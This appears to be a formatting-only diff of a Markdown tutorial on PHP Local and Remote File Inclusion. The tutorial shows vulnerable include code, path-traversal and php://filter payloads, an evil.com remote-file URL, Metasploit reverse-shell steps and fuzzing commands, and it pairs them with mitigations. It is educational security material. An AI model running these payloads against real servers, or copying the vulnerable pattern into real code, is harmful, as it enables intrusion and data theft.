@@ -1,8 +1,8 @@
-## **1️ Local File Inclusion (LFI)**
-### ** What is LFI?**  
+## 1️ Local File Inclusion (LFI)
+###  What is LFI?  
 LFI occurs when an attacker **includes local files** (e.g., `/etc/passwd`, `config.php`) in a web application. This happens due to **poorly validated** user input in the file inclusion function.  
 
-### ** Example of LFI**  
+### Example of LFI  
 A vulnerable PHP script:
 ```php
 <?php
@@ -16,18 +16,18 @@ http://example.com/vulnerable.php?file=/etc/passwd
 ```
 ✔ If successful, it will display the contents of `/etc/passwd` (Linux user database).  
 
-### ** LFI Attack Techniques**
+###  LFI Attack Techniques
 - **Reading sensitive files** (e.g., `/etc/passwd`, `C:\windows\win.ini`)
 - **Log poisoning** (injecting PHP code into logs and executing it)
 - **PHP Wrappers** (`php://filter`, `php://input`)
 
 ---
 
-## **2️ Remote File Inclusion (RFI)**
-### ** What is RFI?**  
-RFI happens when an attacker includes a **remote malicious file** (hosted on their server). This allows them to execute arbitrary PHP code on the target server.
+## 2️ Remote File Inclusion (RFI)
+###  What is RFI?  
+RFI happens when an attacker includes a remote malicious file (hosted on their server). This allows them to execute arbitrary PHP code on the target server.
 
-### ** Example of RFI**  
+### Example of RFI
 A vulnerable PHP script:
 ```php
 <?php
@@ -35,28 +35,28 @@ $file = $_GET['file'];
 include($file);
 ?>
 ```
-An attacker can load a **remote malicious PHP file**:
+An attacker can load a remote malicious PHP file:
 ```
 http://example.com/vulnerable.php?file=http://evil.com/malicious.php
 ```
 ✔ If successful, the script from `evil.com` executes on the target server!
 
-### ** RFI Attack Techniques**
-- **Remote shell upload** (reverse shell)
-- **Defacing websites**
-- **Executing malware on the target server**
+### RFI Attack Techniques
+- Remote shell upload (reverse shell)
+- Defacing websites
+- Executing malware on the target server
 
 ---
 
-## **3️ How to Prevent LFI & RFI?**
-###  **Mitigations:**
-1. **Use Whitelisting** – Allow only specific files to be included.
-2. **Disable `allow_url_include` in PHP**:
+## 3️ How to Prevent LFI & RFI?
+###  Mitigations:
+1. Use Whitelisting – Allow only specific files to be included.
+2. Disable `allow_url_include` in PHP:
    ```ini
    allow_url_include = Off
    ```
-3. **Use `realpath()` & `basename()`** to validate input.
-4. **Restrict file paths** to prevent directory traversal attacks.
+3. Use `realpath()` & `basename()` to validate input.
+4. Restrict file paths to prevent directory traversal attacks.
 
 ---
 
@@ -163,35 +163,35 @@ gobuster dir -u http://target.com/ -w /usr/share/wordlists/dirb/common.txt -x ph
 
 ---
 
-## ** 2. Exploit LFI Using Burp Suite**
-### ** Burp Suite to Test LFI Manually**
-1. Open **Burp Suite** → Turn on **Intercept**.
+##  2. Exploit LFI Using Burp Suite
+###  Burp Suite to Test LFI Manually
+1. Open Burp Suite → Turn on Intercept.
 2. Capture the request for `vulnerable.php?file=xyz`.
 3. Modify the parameter to test LFI:
    ```
    vulnerable.php?file=../../../../etc/passwd
    ```
-4. **Forward the request** → If successful, you'll see `/etc/passwd`.
+4. Forward the request → If successful, you'll see `/etc/passwd`.
 
-✔ You can also use **PHP Wrappers** for deeper exploitation:
+✔ You can also use PHP Wrappers for deeper exploitation:
 ```
 vulnerable.php?file=php://filter/convert.base64-encode/resource=config.php
 ```
-Then **decode the base64 output** to view sensitive information.
+Then decode the base64 output to view sensitive information.
 
 ---
 
-## **3️ Exploit RFI Using Metasploit**
-### ** Use Metasploit to Get a Reverse Shell**
+## 3️ Exploit RFI Using Metasploit
+###  Use Metasploit to Get a Reverse Shell
 1. Start Metasploit:
    ```bash
    msfconsole
    ```
-2. Use the **RFI Exploit Module**:
+2. Use the RFI Exploit Module:
    ```bash
    use exploit/unix/webapp/php_include
    ```
-3. Set the **target URL**:
+3. Set the target URL:
    ```bash
    set TARGETURI /vulnerable.php?file=
    set RHOSTS target.com
@@ -200,27 +200,27 @@ Then **decode the base64 output** to view sensitive information.
    set LPORT 4444
    exploit
    ```
-✔ If successful, you will get a **Meterpreter shell**, allowing you to execute commands on the server!
+✔ If successful, you will get a Meterpreter shell, allowing you to execute commands on the server!
 
 ---
 
-## ** Bonus: Automate LFI & RFI with Fuzzing**
-Use **wfuzz** to brute-force file inclusion:
+## Bonus: Automate LFI & RFI with Fuzzing
+Use wfuzz to brute-force file inclusion:
 ```bash
 wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc=404 "http://target.com/vulnerable.php?file=FUZZ"
 ```
-✔ This will **find accessible files** and possible LFI/RFI entry points.
+✔ This will find accessible files and possible LFI/RFI entry points.
 
 ---
 
-## ** How to Stay Secure?**
-- **Sanitize user input** (use `basename()` and `realpath()`).
-- **Disable `allow_url_include`** in `php.ini`:
+##  How to Stay Secure?
+- Sanitize user input (use `basename()` and `realpath()`).
+- Disable `allow_url_include` in `php.ini`:
   ```ini
   allow_url_include = Off
   ```
-- **Use web application firewalls** (e.g., ModSecurity).
-- **Monitor logs** for suspicious requests.
+- Use web application firewalls (e.g., ModSecurity).
+- Monitor logs for suspicious requests.
 
 ---
 
